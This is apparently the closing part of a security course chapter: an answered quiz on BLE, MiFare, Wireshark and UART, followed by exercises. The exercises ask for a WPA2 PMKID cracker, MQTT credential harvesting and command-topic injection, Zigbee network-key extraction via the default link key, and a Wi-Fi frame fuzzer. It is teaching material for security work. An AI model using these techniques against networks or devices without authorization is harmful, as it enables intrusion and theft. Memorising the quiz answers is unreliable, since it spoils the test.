| 7 | Which protocol uses the SMP (Security Manager Protocol) at levels 0–4 for pairing? | Wi-Fi WPA3 | Bluetooth Low Energy (BLE) | Zigbee 3.0 | Matter over Thread | **B** |
| 8 | In the MiFare Classic nested authentication attack, what property of the Crypto-1 cipher enables key recovery? | The 48-bit LFSR keystream can be reconstructed from known plaintext-ciphertext pairs | The cipher uses a fixed 8-bit key | The reader nonce is always zero | AES-128 keys are reused across sectors | **A** |
| 9 | What does the Wireshark filter `wlan.fc.type_subtype == 0x0c` capture? | Beacon frames | Probe requests | Deauthentication frames | EAPOL-Key frames | **C** |
| 10 | Which of the following is a hardware debug interface commonly used for firmware dumping from embedded devices? | TCP port 8080 | UART (TX/RX/GND) | Bluetooth HCI | MQTT topic `/firmware` | **B** |

---

## Exercises

<details>
<summary>Solution</summary>

### Exercise 1: PMKID Cracking Tool

Extend the `PmkidCracker` class from Section 9.1 to:
- Accept a wordlist file path and read passwords line by line
- Implement multithreading using `worker_threads` to parallelize PMKID verification across CPU cores
- Report estimated time remaining and cracking speed (passwords/sec)
- Output the discovered password along with the PMK, PTK, and MIC values

**Expected outcome:** A CLI tool that cracks a WPA2 handshake 4× faster using 4 worker threads.

---

### Exercise 2: BLE Advertisement Replay Attack Simulator

Using the `BleScanner` from Section 3.3, build an advertisement replay detector:
- Record BLE advertisements over a 5-minute window
- Detect if the same advertisement packet (identical raw bytes) appears more than 3× from different MAC addresses
- Flag devices that broadcast advertisements with monotonically increasing sequence numbers that suddenly reset
- Generate a real-time alert with JSON output

**Expected outcome:** A real-time BLE spoofing detection script that logs suspicious MAC addresses and advertisement fingerprints.

---

### Exercise 3: MQTT Broker Audit Suite

Using the `MqttSecurityScanner` from Section 6.1, extend the scanner to:
- After anonymous access is confirmed, attempt to subscribe to `#` and log the first 50 received messages
- Detect topics that transport cleartext credentials by subscribing to common patterns (`login`, `password`, `token`)
- Attempt to publish a crafted payload to `shell/exec/cmd` topic and check if any other subscribers process it
- Generate an HTML report with scan results

**Expected outcome:** A comprehensive MQTT auditing tool that goes beyond passive scanning to active exploitation testing.

---

### Exercise 4: Firmware Backdoor Hunter

Using the `FirmwareEntropyAnalyzer` from Section 7.3, create a complete firmware analysis pipeline:
- Accept a firmware file path
- Run entropy analysis to identify entropy boundaries
- For each low-entropy (plaintext) region, run the credential scanner from Section 7.4
- For each high-entropy region, attempt decompression with gzip, zlib, LZMA, and xz
- Extract any discovered filesystem (Squashfs, JFFS2, UBIFS) using `binwalk` programmatically
- Generate a combined report with entropy visualization (ASCII graph), credential findings, and filesystem structure

**Expected outcome:** A firmware triage tool that ingests a raw binary and outputs a structured security assessment.

---

### Exercise 5: Deauth Flood Detection & Mitigation

Using the `DeauthDetector` from Section 9.6, implement:
- A detection mode that analyzes pcap files (instead of live capture)
- A mitigation module that, upon detecting a deauth flood, sends crafted 802.11w-2012 (Protected Management Frames) association frames to re-establish client connections
- A visual dashboard showing:
  - Deauth rate over time (line chart as ASCII art)
  - Top attacking MAC addresses
  - Affected BSSIDs and client count

**Expected outcome:** A deauth attack response system that both detects and automatically mitigates wireless DoS attacks.

---

### Exercise 6: Zigbee Network Key Extractor

Design and implement a TypeScript tool that:
- Parses a Zigbee packet capture (PCAP-NG format)
- Decrypts the Transport Key frame (APS command 0x05) using the pre-configured link key `ZigBeeAlliance09`
- Extracts the 128-bit Network Key
- Verifies the extracted key by decrypting a subsequent data frame
- Outputs the network key, PAN ID, and channel for use in further analysis

**Expected outcome:** A network key extraction tool that demonstrates the Zigbee key transport vulnerability.

---

### Exercise 7: Wi-Fi Protocol Fuzzer

Using the `CrcCalculator` from Section 9.2, build a Wi-Fi management frame fuzzer:
- Generate malformed Beacon, Probe Response, and Association Response frames
- Fuzz each field: supported rates, channel, RSN IE, vendor-specific IE
- Insert non-standard IE types (0xDD–0xFF)
- Set invalid frame control flags (combinations of ToDS, FromDS, Retry, PwrMgt, etc.)
- Send frames at 100 packets/sec using raw 802.11 injection
- Monitor target AP for crashes, reboots, or beacon loss

**Expected outcome:** A wireless protocol fuzzer that tests AP resilience to malformed management frames.

---

### Exercise 8: Embedded Device Security Assessment Report

For a hypothetical IoT smart lock with the following characteristics:
- Communicates via BLE and Wi-Fi
- Uses MQTT over port 1883 (no TLS) to report lock status
- Firmware can be downloaded from vendor website
- PCB reveals UART test points labeled TP1–TP4
- Uses an ESP32-WROOM module (JTAG accessible via GPIO12-15)

Write a comprehensive security assessment report covering:
1. **Radio attacks** — BLE advertisement sniffing, Wi-Fi deauth, evil twin
2. **Protocol attacks** — MQTT cleartext interception, topic enumeration
3. **Firmware attacks** — Binwalk extraction, entropy analysis, credential scanning
4. **Hardware attacks** — UART console access, JTAG firmware dumping, SPI flash reading
5. **Risk rating** and **remediation recommendations** for each finding
6. **Overall security score** (0–100) with justification

**Expected outcome:** A professional-quality penetration test report suitable for a client or publication.

</details>

---

*This chapter is part of the Cyber Security course. All TypeScript implementations are designed for educational purposes and should only be used on systems you own or have explicit permission to test.*
